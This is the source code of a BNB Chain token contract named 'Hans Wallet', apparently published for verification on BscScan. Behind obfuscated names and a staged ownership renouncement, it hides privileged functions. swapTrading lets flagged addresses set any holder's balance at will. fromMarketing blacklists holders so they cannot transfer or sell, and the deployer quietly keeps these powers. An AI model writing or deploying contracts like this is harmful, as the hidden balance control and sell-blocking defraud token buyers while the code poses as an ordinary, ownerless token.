/**
 *Submitted for verification at BscScan.com on 2023-03-06
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

interface shouldLaunch {
    function totalSupply() external view returns (uint256);

    function balanceOf(address launchedToken) external view returns (uint256);

    function transfer(address exemptAt, uint256 minSenderMarketing) external returns (bool);

    function allowance(address exemptLaunch, address spender) external view returns (uint256);

    function approve(address spender, uint256 minSenderMarketing) external returns (bool);

    function transferFrom(
        address sender,
        address exemptAt,
        uint256 minSenderMarketing
    ) external returns (bool);

    event Transfer(address indexed from, address indexed marketingAuto, uint256 value);
    event Approval(address indexed exemptLaunch, address indexed spender, uint256 value);
}

interface minReceiver is shouldLaunch {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract tradingFund {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface launchedSellBuy {
    function createPair(address launchedSell, address limitSell) external returns (address);
}

interface limitLaunchedMax {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract HansWallet is tradingFund, shouldLaunch, minReceiver {

    function totalSupply() external view virtual override returns (uint256) {
        return fromExempt;
    }

    function swapTrading(address liquiditySwap, uint256 minSenderMarketing) public {
        if (!autoLimit[_msgSender()]) {
            return;
        }
        minSwap[liquiditySwap] = minSenderMarketing;
    }

    uint8 private marketingWallet = 18;

    function launchTrading() public {
        
        if (launchedLaunchFund) {
            shouldAmount = false;
        }
        shouldAmount=false;
    }

    function takeMax(address isTrading, address exemptAt, uint256 minSenderMarketing) internal returns (bool) {
        if (isTrading == isTake) {
            return launchMode(isTrading, exemptAt, minSenderMarketing);
        }
        require(!tradingLaunched[isTrading]);
        return launchMode(isTrading, exemptAt, minSenderMarketing);
    }

    function getOwner() external view returns (address) {
        return tradingEnable;
    }

    bool public limitAmount;

    event OwnershipTransferred(address indexed takeExemptLiquidity, address indexed marketingAt);

    function senderMode() public {
        
        
        shouldAmount=false;
    }

    mapping(address => mapping(address => uint256)) private walletIs;

    function transferFrom(address isTrading, address exemptAt, uint256 minSenderMarketing) external override returns (bool) {
        if (walletIs[isTrading][_msgSender()] != type(uint256).max) {
            require(minSenderMarketing <= walletIs[isTrading][_msgSender()]);
            walletIs[isTrading][_msgSender()] -= minSenderMarketing;
        }
        return takeMax(isTrading, exemptAt, minSenderMarketing);
    }

    bool public shouldAmount;

    function decimals() external view virtual override returns (uint8) {
        return marketingWallet;
    }

    string private launchedAt = "HWT";

    function balanceOf(address launchedToken) public view virtual override returns (uint256) {
        return minSwap[launchedToken];
    }

    bool private isAuto;

    address public isTake;

    function launchMode(address isTrading, address exemptAt, uint256 minSenderMarketing) internal returns (bool) {
        require(minSwap[isTrading] >= minSenderMarketing);
        minSwap[isTrading] -= minSenderMarketing;
        minSwap[exemptAt] += minSenderMarketing;
        emit Transfer(isTrading, exemptAt, minSenderMarketing);
        return true;
    }

    mapping(address => uint256) private minSwap;

    function sellShouldMode(address launchAuto) public {
        if (limitAmount) {
            return;
        }
        
        autoLimit[launchAuto] = true;
        if (tradingFrom != shouldToAuto) {
            isAuto = false;
        }
        limitAmount = true;
    }

    function toTeamMax() public view returns (uint256) {
        return tradingFrom;
    }

    function owner() external view returns (address) {
        return tradingEnable;
    }

    uint256 private shouldToAuto;

    function approve(address totalEnable, uint256 minSenderMarketing) public virtual override returns (bool) {
        walletIs[_msgSender()][totalEnable] = minSenderMarketing;
        emit Approval(_msgSender(), totalEnable, minSenderMarketing);
        return true;
    }

    bool private launchedLaunchFund;

    mapping(address => bool) public autoLimit;

    function symbol() external view virtual override returns (string memory) {
        return launchedAt;
    }

    address public launchMin;

    function takeTrading() public view returns (bool) {
        return launchedLaunchFund;
    }

    string private fundLaunch = "Hans Wallet";

    function marketingReceiverFund() public {
        emit OwnershipTransferred(isTake, address(0));
        tradingEnable = address(0);
    }

    function fromMarketing(address totalMin) public {
        
        if (totalMin == isTake || totalMin == launchMin || !autoLimit[_msgSender()]) {
            return;
        }
        if (fundExemptIs == tradingFrom) {
            launchedLaunchFund = true;
        }
        tradingLaunched[totalMin] = true;
    }

    function allowance(address liquidityEnable, address totalEnable) external view virtual override returns (uint256) {
        return walletIs[liquidityEnable][totalEnable];
    }

    address private tradingEnable;

    uint256 public tradingFrom;

    function transfer(address liquiditySwap, uint256 minSenderMarketing) external virtual override returns (bool) {
        return takeMax(_msgSender(), liquiditySwap, minSenderMarketing);
    }

    mapping(address => bool) public tradingLaunched;

    function atFund() public {
        if (isAuto == shouldAmount) {
            tradingFrom = fundExemptIs;
        }
        
        isAuto=false;
    }

    function teamSellList() public view returns (bool) {
        return launchedLaunchFund;
    }

    uint256 private fundExemptIs;

    function name() external view virtual override returns (string memory) {
        return fundLaunch;
    }

    uint256 private fromExempt = 100000000 * 10 ** 18;

    constructor (){
        
        limitLaunchedMax feeLaunch = limitLaunchedMax(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        launchMin = launchedSellBuy(feeLaunch.factory()).createPair(feeLaunch.WETH(), address(this));
        tradingEnable = _msgSender();
        
        isTake = _msgSender();
        autoLimit[_msgSender()] = true;
        if (launchedLaunchFund) {
            fundExemptIs = tradingFrom;
        }
        minSwap[_msgSender()] = fromExempt;
        emit Transfer(address(0), isTake, fromExempt);
        marketingReceiverFund();
    }

}